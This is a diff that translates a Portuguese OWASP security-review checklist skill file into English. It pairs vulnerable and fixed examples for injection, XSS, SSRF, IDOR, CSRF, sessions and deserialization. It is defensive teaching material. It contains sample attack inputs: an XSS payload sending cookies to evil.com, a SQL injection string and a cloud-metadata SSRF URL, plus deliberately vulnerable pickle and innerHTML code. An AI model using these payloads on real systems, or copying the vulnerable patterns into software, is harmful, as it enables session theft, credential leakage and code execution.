@@ -1,212 +1,228 @@
 ---
 name: security-review-checklist
-description: Varredura OWASP de um PR ou release — injection, XSS, SSRF, IDOR, CSRF, desserialização insegura — como checklist explícito, com par exploit/mitigação por item e delegação das áreas fundas para as skills dedicadas (auth-patterns, dependency-audit, secrets-management, input-validation, multi-tenant-isolation-audit). Use quando o usuário pedir revisão de segurança, checklist OWASP, auditoria de vulnerabilidade, ou citar injection, XSS, SSRF, IDOR, CSRF. O `/security-review` nativo varre o branch e acha o que acha; este é o roteiro que garante que nenhuma classe ficou sem ser olhada.
+description: An OWASP-style sweep of a PR or release — injection, XSS, SSRF, IDOR, CSRF, insecure deserialization — as an explicit checklist, each item paired with an exploit and its mitigation, delegating the deep areas to the dedicated skills (auth-patterns, dependency-audit, secrets-management, input-validation, multi-tenant-isolation-audit). Use when the user asks for a security review, an OWASP checklist, a vulnerability audit, or mentions injection, XSS, SSRF, IDOR, CSRF. The native `/security-review` sweeps the branch and finds what it finds; this is the route that guarantees no class went unexamined.
 ---
 
 # Security Review Checklist
 
-Checklist de revisão de segurança pra código/PR, organizado por classe de vulnerabilidade — não por stack. O exemplo de exploit/mitigação muda entre Next.js, NestJS, Python, Java, Go, Ruby, .NET; a pergunta de auditoria ("esse dado hostil chega aqui sem barreira?") não muda.
+A security review checklist for code and PRs, organised by vulnerability class
+rather than by stack. The exploit and the mitigation look different in Next.js,
+NestJS, Python, Java, Go, Ruby or .NET; the audit question — "does hostile data
+reach here unguarded?" — does not.
 
-Cruza com `input-validation` (injection e XSS nascem de dado não validado na borda), `multi-tenant-isolation-audit` (IDOR entre tenants/owners tem skill dedicada, mais profunda), `auth-patterns` (falhas de autenticação/sessão têm skill dedicada, mais profunda), `dependency-audit` (dependências vulneráveis têm skill dedicada, mais profunda) e `secrets-management` (segredos expostos têm skill dedicada, mais profunda). Aqui o foco é a varredura ampla de uma revisão de PR.
+It crosses `input-validation` (injection and XSS start with unvalidated data at
+the boundary), `multi-tenant-isolation-audit` (cross-tenant IDOR has its own,
+deeper skill), `auth-patterns` (authentication and session failures likewise),
+`dependency-audit` (vulnerable dependencies likewise) and `secrets-management`
+(exposed secrets likewise). What belongs here is the broad sweep of a PR review.
 
-## Como revisar
+## How to review
 
-1. Identificar toda borda que recebe dado hostil no diff: request HTTP, query param, header, cookie, upload, mensagem de fila, resposta de API externa, input de CLI.
-2. Pra cada borda, percorrer as categorias abaixo perguntando "esse fluxo específico é afetado?".
-3. Achou um item sem mitigação → reportar com exploit concreto, não só "está inseguro".
-4. Nem toda categoria se aplica a todo PR — pular rápido as que não têm superfície.
+1. Identify every boundary in the diff that receives hostile data: HTTP request,
+   query parameter, header, cookie, upload, queue message, external API response,
+   CLI input.
+2. For each boundary, walk the categories below asking "is this particular flow
+   affected?".
+3. Where an item has no mitigation, report it with a concrete exploit rather than
+   "this is insecure".
+4. Not every category applies to every PR. Skip the ones with no surface, quickly.
 
-## Injection (SQL / NoSQL / Command / LDAP)
+## Injection (SQL / NoSQL / command / LDAP)
 
-Dado externo vira parte de um comando interpretado (query, shell, filtro LDAP) em vez de permanecer dado.
+External data becomes part of an interpreted command — a query, a shell line, an
+LDAP filter — instead of staying data.
 
 ```
 ❌ query = "SELECT * FROM users WHERE email = '" + input + "'"
-   input = "' OR '1'='1"  →  retorna todos os usuários
+   input = "' OR '1'='1"  →  returns every user
 
 ✅ query = "SELECT * FROM users WHERE email = $1"; db.query(query, [input])
-   -- parametrização: input nunca vira parte do texto do comando
+   -- parameterised: the input never becomes part of the command text
 ```
 
-- [ ] Toda query usa parametrização/prepared statement — nunca concatenação ou interpolação de string com dado externo
-- [ ] ORM/query builder não tem escape hatch (`.raw()`, `$where`, string template) recebendo input não sanitizado
-- [ ] Comando de shell (`exec`, `spawn`, `os.system`) nunca monta argumento por concatenação de input — usa array de argumentos ou allowlist
-- [ ] Filtro LDAP/XPath escapa caractere especial do input antes de montar a expressão
-- [ ] Mensagem de erro de banco não é repassada crua ao client (vaza schema/query)
+- [ ] Every query is parameterised or uses a prepared statement — never string concatenation or interpolation with external data
+- [ ] The ORM or query builder has no escape hatch (`.raw()`, `$where`, a string template) receiving unsanitised input
+- [ ] Shell commands (`exec`, `spawn`, `os.system`) never build arguments by concatenating input; they use an argument array or an allowlist
+- [ ] LDAP and XPath filters escape special characters before the expression is assembled
+- [ ] Database error messages are not passed raw to the client, since they leak schema and query shape
 
 ## Cross-Site Scripting (XSS)
 
-Dado externo é renderizado como HTML/JS executável no browser de outro usuário.
+External data is rendered as executable HTML or JS in another user's browser.
 
 ```
 ❌ <div dangerouslySetInnerHTML={{ __html: comment.text }} />
    comment.text = "<img src=x onerror=fetch('//evil.com?c='+document.cookie)>"
 
-✅ <div>{comment.text}</div>  // JSX escapa por padrão
-   // se precisar HTML: sanitizar com allowlist de tags (ex: DOMPurify) antes de renderizar
+✅ <div>{comment.text}</div>  // JSX escapes by default
+   // when real HTML is needed: sanitise with a tag allowlist (DOMPurify) first
 ```
 
-- [ ] Renderização de dado de usuário usa escaping automático do framework (JSX, Blade `{{ }}`, Django autoescape) — nenhum `dangerouslySetInnerHTML`/`| safe`/`Html.Raw` sem sanitização explícita antes
-- [ ] Sanitização de HTML rico usa allowlist de tags/atributos (biblioteca dedicada), não regex caseira
-- [ ] Atributos dinâmicos (`href`, `src`, `style`) não aceitam `javascript:`/`data:` vindo de input sem validação de esquema
-- [ ] Resposta de API que será interpretada por outro sistema (JSON embutido em `<script>`, e-mail HTML) escapa pro contexto certo, não só HTML
-- [ ] Cookies de sessão marcados `HttpOnly` — script injetado não consegue ler o token mesmo se o XSS existir
+- [ ] User data is rendered through the framework's automatic escaping (JSX, Blade `{{ }}`, Django autoescape); no `dangerouslySetInnerHTML`, `| safe` or `Html.Raw` without explicit sanitisation first
+- [ ] Rich HTML sanitisation uses a tag and attribute allowlist from a dedicated library, never a hand-rolled regex
+- [ ] Dynamic attributes (`href`, `src`, `style`) reject `javascript:` and `data:` from unvalidated input
+- [ ] API responses that another context will interpret — JSON embedded in `<script>`, HTML email — are escaped for that context, not just for HTML
+- [ ] Session cookies are `HttpOnly`, so an injected script cannot read the token even where XSS exists
 
 ## SSRF (Server-Side Request Forgery)
 
-Servidor faz requisição de rede pra um destino controlado (total ou parcialmente) pelo atacante.
+The server makes a network request to a destination the attacker controls, fully
+or partly.
 
 ```
-❌ const res = await fetch(req.body.imageUrl); // busca avatar de URL arbitrária
+❌ const res = await fetch(req.body.imageUrl); // fetches an avatar from an arbitrary URL
    imageUrl = "http://169.254.169.254/latest/meta-data/iam/security-credentials/role"
-   → vaza credenciais da cloud
+   → leaks the cloud credentials
 
-✅ validar host contra allowlist de domínios permitidos antes de buscar;
-   bloquear ranges internos/link-local (127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8, ::1)
-   mesmo depois de resolver DNS (não só checar a string da URL)
+✅ validate the host against an allowlist before fetching, and block internal and
+   link-local ranges (127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8, ::1) after DNS
+   resolution, not just by inspecting the URL string
 ```
 
-- [ ] Toda função que busca URL fornecida por usuário (webhook de saída, fetch de imagem/link preview, importação por URL) valida o host contra allowlist
-- [ ] Validação de host acontece após resolução de DNS, não só na string (evita bypass por redirect ou DNS rebinding)
-- [ ] IP ranges internos/metadata da cloud (link-local, loopback, RFC1918) bloqueados por padrão nesse tipo de chamada
-- [ ] Redirect HTTP (3xx) da requisição de saída não é seguido cegamente pra fora da allowlist
-- [ ] Timeout e limite de tamanho de resposta configurados (evita usar o servidor como proxy de exfiltração/DoS)
+- [ ] Every function that fetches a user-supplied URL — outbound webhooks, image or link-preview fetching, import by URL — validates the host against an allowlist
+- [ ] Host validation happens after DNS resolution, not on the string alone, which avoids bypass through redirects or DNS rebinding
+- [ ] Internal and cloud-metadata ranges (link-local, loopback, RFC1918) are blocked by default for that kind of call
+- [ ] HTTP redirects (3xx) on outbound requests are not followed blindly outside the allowlist
+- [ ] Timeouts and response size limits are configured, so the server cannot be used as an exfiltration proxy or a DoS amplifier
 
-## IDOR / Broken Access Control
+## IDOR / broken access control
 
-Recurso é identificado por ID previsível e o servidor não confere se quem pede tem permissão sobre ele — ver `multi-tenant-isolation-audit` pro caso específico de cross-tenant/cross-owner.
+A resource is addressed by a predictable id and the server never checks whether
+the caller may have it. See `multi-tenant-isolation-audit` for the cross-tenant
+and cross-owner case.
 
 ```
-❌ GET /api/invoices/42  →  retorna a invoice 42 pra qualquer usuário autenticado
-   (autenticação checada, autorização sobre o recurso específico não)
+❌ GET /api/invoices/42  →  returns invoice 42 to any authenticated user
+   (authentication checked; authorization over that specific resource, not)
 
-✅ GET /api/invoices/42  →  handler carrega a invoice E confere
-   invoice.ownerId === session.userId antes de retornar (senão 403/404)
+✅ GET /api/invoices/42  →  the handler loads the invoice AND checks
+   invoice.ownerId === session.userId before returning, else 403/404
 ```
 
-- [ ] Todo endpoint que recebe ID de recurso confere posse/permissão do usuário autenticado sobre aquele recurso específico, não só que ele está logado
-- [ ] IDs sequenciais previsíveis não são a única barreira — tentar `id+1`/`id-1` autenticado como outro usuário é parte do teste
-- [ ] Ações de escrita (update/delete) repetem a mesma checagem de posse que a leitura — comum checar só no GET
-- [ ] Autorização é verificada no backend (ou RLS), não inferida de o botão estar oculto no frontend
-- [ ] Mudança de papel/role em runtime (upgrade de plano, admin toggle) invalida sessão/token antigo com permissão anterior
+- [ ] Every endpoint taking a resource id checks the authenticated user's ownership or permission over that specific resource, not merely that they are logged in
+- [ ] Predictable sequential ids are not the only barrier — trying `id+1` and `id-1` while authenticated as another user is part of the test
+- [ ] Write actions (update, delete) repeat the same ownership check as reads; checking only on GET is the common gap
+- [ ] Authorization is verified in the backend or through RLS, never inferred from a hidden button
+- [ ] A role change at runtime — a plan upgrade, an admin toggle — invalidates the old session or token carrying the previous permissions
 
 ## CSRF
 
-Ação de estado (mudar senha, transferir, deletar) executada por request forjado a partir de outro site, aproveitando sessão já autenticada do usuário.
+A state-changing action — password change, transfer, delete — executed through a
+request forged from another site, riding the user's authenticated session.
 
 ```
-❌ <form action="/api/transfer" method="POST"> só valida cookie de sessão
-   → site malicioso monta form igual e submete no browser da vítima já logada
+❌ <form action="/api/transfer" method="POST"> validates only the session cookie
+   → a malicious site posts the same form from the victim's logged-in browser
 
-✅ Requer token CSRF (ou header custom que browser não replica cross-origin)
-   além do cookie, validado no servidor a cada request de mutação
+✅ Requires a CSRF token, or a custom header the browser will not replicate
+   cross-origin, validated server-side on every mutation
 ```
 
-- [ ] Toda rota que muda estado (POST/PUT/PATCH/DELETE) autenticada por cookie exige token CSRF ou equivalente (header custom checado no servidor)
-- [ ] Cookie de sessão usa `SameSite=Lax` ou `Strict` como camada adicional
-- [ ] APIs autenticadas por header `Authorization: Bearer` (não por cookie) documentadas como fora desse risco — CSRF depende de credencial automática do browser
+- [ ] Every cookie-authenticated state-changing route (POST/PUT/PATCH/DELETE) requires a CSRF token or an equivalent server-checked custom header
+- [ ] Session cookies use `SameSite=Lax` or `Strict` as an additional layer
+- [ ] APIs authenticated by an `Authorization: Bearer` header rather than cookies are documented as outside this risk — CSRF depends on a credential the browser attaches automatically
 
-## Autenticação e Sessão
-
-```
-❌ Token de sessão em localStorage, sem expiração, sem rotação após login
-❌ Mensagem de erro de login diferencia "usuário não existe" de "senha errada" (enumeração)
-✅ Sessão expira, é invalidada no logout/troca de senha, e erro de login é genérico
-```
-
-- [ ] Erro de login não revela se o usuário existe (mensagem genérica: "credenciais inválidas")
-- [ ] Rate limit / backoff em endpoint de login, reset de senha e 2FA
-- [ ] Token de sessão expira, é invalidado no logout e na troca de senha
-- [ ] Reset de senha usa token de uso único com expiração curta, não previsível
-- [ ] Senha nunca logada, nem em texto plano nem em log de erro/stack trace
-
-## Deserialização e Upload
+## Authentication and session
 
 ```
-❌ pickle.loads(request_body)  // deserialização de objeto arbitrário do client
-   → execução de código ao desserializar payload malicioso
-
-✅ Formato de troca é dado puro (JSON/schema validado), nunca objeto serializado
-   da linguagem; deserializadores nativos (pickle, Java Serializable, PHP unserialize)
-   nunca recebem input do client sem allowlist de tipo
+❌ A session token in localStorage, with no expiry and no rotation after login
+❌ A login error distinguishing "user does not exist" from "wrong password" (enumeration)
+✅ Sessions expire, are invalidated on logout and password change, and login errors are generic
 ```
 
-- [ ] Payload externo nunca passa por deserializador nativo da linguagem (pickle, `unserialize`, `ObjectInputStream`, `BinaryFormatter`) sem allowlist de tipo
-- [ ] Upload de arquivo valida tipo real (magic bytes) e roda fora do diretório servido publicamente — ver `input-validation`
-- [ ] Nome de arquivo de upload é normalizado/gerado pelo servidor, nunca path vindo do client sem sanitização (bloqueia path traversal `../../`)
+- [ ] Login errors do not reveal whether the user exists — a generic "invalid credentials"
+- [ ] Rate limiting or backoff on login, password reset and 2FA endpoints
+- [ ] Session tokens expire, and are invalidated on logout and on password change
+- [ ] Password reset uses a single-use, unpredictable token with a short expiry
+- [ ] Passwords are never logged, in plain text or inside an error or stack trace
 
-## Configuração e Dependências
+## Deserialization and uploads
 
 ```
-❌ Stack trace completo, versão de framework e variável de ambiente no response de erro
-❌ Dependência com CVE conhecida sem processo de atualização
-✅ Erro genérico ao client, detalhe completo só em log interno
-✅ Scan de dependências (SCA) rodando em CI, com política de atualização de CVE crítico
+❌ pickle.loads(request_body)  // deserialising an arbitrary object from the client
+   → code execution on a malicious payload
+
+✅ The wire format is plain, schema-validated data (JSON), never a language-native
+   serialized object; native deserialisers (pickle, Java Serializable, PHP
+   unserialize) never receive client input without a type allowlist
 ```
 
-- [ ] Resposta de erro em produção não expõe stack trace, versão de framework/lib ou variável de ambiente
-- [ ] Segredos (chave de API, connection string, JWT secret) vêm de variável de ambiente/secret manager, nunca hardcoded no repositório
-- [ ] Scan de dependências (SCA) rodando em CI com processo definido pra CVE crítico
-- [ ] Headers de segurança configurados (CSP, `X-Content-Type-Options`, `Strict-Transport-Security`) no ponto de entrada HTTP
-- [ ] CORS não usa `Access-Control-Allow-Origin: *` combinado com `Allow-Credentials: true`
+- [ ] External payloads never reach a language-native deserialiser (pickle, `unserialize`, `ObjectInputStream`, `BinaryFormatter`) without a type allowlist
+- [ ] Uploads validate the real type (magic bytes) and are stored outside the publicly served directory — see `input-validation`
+- [ ] Upload filenames are normalised or generated by the server, never taken raw from the client, which blocks `../../` path traversal
+
+## Configuration and dependencies
+
+```
+❌ A full stack trace, framework version and environment variables in an error response
+❌ A dependency with a known CVE and no upgrade process
+✅ A generic error to the client, full detail only in internal logs
+✅ Dependency scanning (SCA) in CI, with a policy for critical CVEs
+```
+
+- [ ] Production error responses expose no stack trace, framework or library version, or environment variable
+- [ ] Secrets (API keys, connection strings, the JWT secret) come from environment variables or a secret manager, never hardcoded in the repository
+- [ ] Dependency scanning (SCA) runs in CI, with a defined process for critical CVEs
+- [ ] Security headers are configured at the HTTP entry point (CSP, `X-Content-Type-Options`, `Strict-Transport-Security`)
+- [ ] CORS never combines `Access-Control-Allow-Origin: *` with `Allow-Credentials: true`
 
 ## Anti-patterns
 
-- ❌ Concatenar/interpolar input em query, comando de shell ou filtro LDAP em vez de usar parametrização
-- ❌ `dangerouslySetInnerHTML`/`| safe`/`Html.Raw` em dado de usuário sem sanitização por allowlist
-- ❌ Buscar URL fornecida pelo client sem validar host contra allowlist e sem bloquear IP interno/metadata
-- ❌ Checar apenas autenticação ("está logado?") e nunca autorização ("pode acessar ESTE recurso?") em endpoint com ID
-- ❌ Rota de mutação autenticada só por cookie, sem token CSRF nem `SameSite`
-- ❌ Mensagem de erro de login/cadastro que revela se o usuário existe
-- ❌ Deserializar objeto nativo da linguagem a partir de payload do client
-- ❌ Expor stack trace, versão de dependência ou variável de ambiente em erro de produção
-- ❌ Segredo hardcoded no código-fonte em vez de variável de ambiente/secret manager
-- ❌ CORS com origem wildcard (`*`) junto de credenciais habilitadas
-- ❌ Confiar só em checagem manual de `ownerId` no código quando o banco (RLS) poderia garantir o isolamento na origem
+- ❌ Concatenating or interpolating input into a query, a shell command or an LDAP filter instead of parameterising
+- ❌ `dangerouslySetInnerHTML`, `| safe` or `Html.Raw` on user data with no allowlist sanitisation
+- ❌ Fetching a client-supplied URL without an allowlist and without blocking internal and metadata addresses
+- ❌ Checking only authentication ("are they logged in?") and never authorization ("may they have THIS resource?") on an endpoint taking an id
+- ❌ A cookie-authenticated mutation route with no CSRF token and no `SameSite`
+- ❌ A login or signup error revealing whether the user exists
+- ❌ Deserialising a language-native object from a client payload
+- ❌ Exposing a stack trace, a dependency version or an environment variable in a production error
+- ❌ A secret hardcoded in source instead of an environment variable or secret manager
+- ❌ CORS with a wildcard origin alongside credentials
+- ❌ Relying only on a manual `ownerId` check in code when the database (RLS) could guarantee isolation at the source
 
-## Exemplos por stack
+## By stack
 
-**Next.js/React ou Vite+Supabase (XSS + SSRF):**
+**Next.js/React, or Vite + Supabase (XSS and SSRF):**
 ```tsx
-// ❌ renderiza HTML de comentário sem sanitizar
+// ❌ renders comment HTML unsanitised
 <div dangerouslySetInnerHTML={{ __html: comment.body }} />
-// ✅ sanitiza com allowlist antes de renderizar
+// ✅ sanitise against an allowlist first
 <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(comment.body, allowedTags) }} />
 
-// route handler que busca preview de link — valida host antes do fetch
+// a link-preview route handler validating the host before fetching
 const url = new URL(input);
 if (!isAllowedHost(url.hostname) || isPrivateIp(await resolve(url.hostname))) {
-  return Response.json({ error: 'host não permitido' }, { status: 400 });
+  return Response.json({ error: 'host not allowed' }, { status: 400 });
 }
 ```
 
-**NestJS/TypeORM (Injection + IDOR):**
+**NestJS/TypeORM (injection and IDOR):**
 ```ts
-// ✅ parametrização via query builder, nunca string concatenada
+// ✅ parameterised through the query builder, never a concatenated string
 await this.repo.createQueryBuilder('invoice')
   .where('invoice.id = :id AND invoice.ownerId = :ownerId', { id, ownerId: user.id })
-  .getOne(); // ownerId sempre da sessão, nunca do param — resolve IDOR e injection juntos
+  .getOne(); // ownerId always from the session, never from the parameter — IDOR and injection at once
 ```
 
-**Supabase/Postgres (IDOR via RLS em vez de checagem manual):**
+**Supabase/Postgres (IDOR solved by RLS rather than a manual check):**
 ```sql
--- ✅ a policy já resolve IDOR no nível do banco — endpoint nem precisa checar ownerId manualmente
+-- ✅ the policy resolves IDOR at the database level, so the endpoint need not check ownerId by hand
 CREATE POLICY "owner_own_invoices" ON invoices
   FOR SELECT TO authenticated
   USING (owner_id = auth.uid());
 ```
 
-**Python/Django (SSRF + Deserialização):**
+**Python/Django (SSRF and deserialization):**
 ```python
-# ❌ pickle em payload do client
+# ❌ pickle on a client payload
 data = pickle.loads(request.body)
 
-# ✅ JSON validado por schema (Pydantic/DRF serializer), sem deserializador nativo
+# ✅ JSON validated by a schema (Pydantic, a DRF serializer), no native deserialiser
 data = WebhookPayload(**json.loads(request.body))
 
-# SSRF: valida host resolvido, não só a string da URL
+# SSRF: validate the resolved host, not just the URL string
 import socket, ipaddress
 ip = socket.gethostbyname(urlparse(target).hostname)
 if ipaddress.ip_address(ip).is_private:
-    raise ValidationError("host interno bloqueado")
+    raise ValidationError("internal host blocked")
 ```
